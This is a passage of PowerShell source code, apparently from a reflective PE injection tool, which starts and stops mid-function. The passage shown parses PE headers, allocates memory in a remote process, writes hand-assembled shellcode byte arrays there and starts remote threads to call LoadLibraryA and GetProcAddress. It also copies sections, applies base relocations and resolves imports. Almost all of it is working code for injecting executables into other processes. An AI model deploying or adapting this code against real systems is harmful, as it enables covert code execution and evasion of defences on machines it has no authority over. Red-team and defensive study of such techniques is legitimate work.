            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        
        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }
        
        return $PEInfo
    }
    
    
    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
        
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
        
        [IntPtr]$DllAddress = [IntPtr]::Zero
        #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
        # Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
        if ($PEInfo.PE64Bit -eq $true)
        {
            #Allocate memory for the address returned by LoadLibraryA
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }
            
            
            #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            
            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem
            
            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

            
            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }
            
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "Unable to write shellcode to remote process memory."
            }
            
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }
            
            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }
        
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $DllAddress
    }
    
    
    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,
        
        [Parameter(Position=2, Mandatory=$true)]
        [IntPtr]
        $FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        [IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
            $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

            #Write FunctionName to memory (will be used in GetProcAddress)
            $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
            $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($RFuncNamePtr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process"
            }

            [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write DLL path to remote process memory"
            }
            if ($FunctionNameSize -ne $NumBytesWritten)
            {
                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
            }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
        
        #Get address of GetProcAddress
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

        
        #Allocate memory for the address returned by GetProcAddress
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }
        
        
        #Write Shellcode to the remote process which will call GetProcAddress
        #Shellcode: GetProcAddress.asm
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem
        
        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
        
        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw "Unable to write shellcode to remote process memory."
        }
        
        $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }
        
        #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        
        return $ProcAddress
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
        
            #Address to copy the section to
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
            
            #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
            # in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
            # SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
            # so truncate SizeOfRawData to VirtualSize
            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }
            
            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }
            
            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }
        
            #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        [Int64]$BaseDifference = 0
        $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
        
        #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }
        
        #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            #If SizeOfBlock == 0, we are done
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

            #Loop through each relocation
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                #Get info for this relocation
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }

                #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
                #This appears to be true for EXE's as well.
                # Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {            
                    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
        
                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }                

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }
            
            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        
        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
                
                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }
                
                #Get the first thunk, then loop through all of them
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                
                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
                    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                    # If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                    # and doing the comparison, just see if it is less than 0
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
                    }
                    
                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
                    }
                    else
                    {
                        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
                    }
                    
                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
                    
                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
